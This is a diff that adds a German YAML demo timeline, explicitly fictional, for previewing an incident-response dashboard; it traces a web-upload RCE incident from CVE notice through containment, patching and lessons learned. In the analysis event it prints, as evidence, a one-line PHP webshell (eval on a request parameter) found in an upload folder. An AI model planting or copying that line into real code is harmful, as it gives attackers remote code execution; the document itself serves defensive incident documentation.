@@ -1,0 +1,91 @@
+# Beispiel-Timeline. Zeitstempel brauchen eine Zeitzonen-Angabe (z.B. +02:00 oder Z).
+# Evidence-Pfade sind relativ zu dieser Datei.
+title: "INC-2026-042: Ausnutzung von CVE-2026-XXXX"
+summary: "Demo-Vorfall zur Vorschau des Dashboards. Alle Namen und Daten sind fiktiv."
+
+events:
+  - id: feed-cve
+    t0: 2026-10-14T06:00:00Z
+    phase: Identification
+    actor: Threat Intel Feed
+    system: OSINT
+    action: "CVE-2026-XXXX veröffentlicht"
+    status: resolved
+    details: |
+      Herstellerhinweis zu einer **Remote Code Execution** im Upload-Modul.
+      Patch ist verfügbar, aber noch nicht eingespielt.
+
+  - id: siem-alert
+    t0: 2026-10-14T08:12:00+02:00
+    phase: Identification
+    actor: SIEM
+    system: wp-portal-01
+    action: "Ungewöhnliche Requests auf /api/upload"
+    status: in_progress
+    triggered_by: feed-cve
+    details: |
+      Mehrere `POST`-Requests mit verdächtigem Content-Type innerhalb von 4 Minuten.
+    evidence:
+      - file: evidence/siem-alert.svg
+        type: screenshot
+        description: "SIEM-Korrelationsregel hat ausgelöst"
+
+  - id: exploit
+    t0: 2026-10-14T08:40:00+02:00
+    phase: Exploit
+    actor: Angreifer (extern)
+    system: wp-portal-01
+    action: "Remote Code Execution erfolgreich"
+    status: in_progress
+    triggered_by: feed-cve
+    details: |
+      Angreifer hat Code als Webserver-User ausgeführt.
+
+  - id: analysis
+    t0: 2026-10-14T09:30:00+02:00
+    phase: Analysis
+    actor: CSIRT Analyst A
+    system: wp-portal-01
+    action: "Webshell im Upload-Verzeichnis gefunden"
+    status: in_progress
+    triggered_by: exploit
+    details: |
+      Dateiname `img_resize.php` im Verzeichnis `/uploads/cache/`.
+
+      ```php
+      // Inhalt entschärft, nur Beleg
+      eval($_REQUEST['x']);
+      ```
+    evidence:
+      - file: evidence/waf-block.svg
+        type: screenshot
+        description: "WAF blockiert nachträglichen Zugriff auf die Webshell"
+
+  - id: containment
+    t0: 2026-10-14T09:55:00+02:00
+    phase: Containment
+    actor: CSIRT Analyst A
+    system: wp-portal-01
+    action: "Host isoliert, WAF-Regel aktiviert"
+    status: resolved
+    triggered_by: analysis
+
+  - id: mitigation
+    t0: 2026-10-14T11:20:00+02:00
+    phase: Mitigation
+    actor: Patch-Team
+    system: wp-portal-01
+    action: "Patch eingespielt, Webshell entfernt"
+    status: resolved
+    triggered_by: containment
+
+  - id: lessons
+    t0: 2026-10-16T10:00:00+02:00
+    phase: Lessons Learned
+    actor: CSIRT Lead
+    action: "Post-Mortem abgeschlossen"
+    status: resolved
+    triggered_by: mitigation
+    details: |
+      - Patch-Prozess für Internet-exponierte Systeme beschleunigen
+      - Upload-Verzeichnisse ohne Ausführungsrechte betreiben
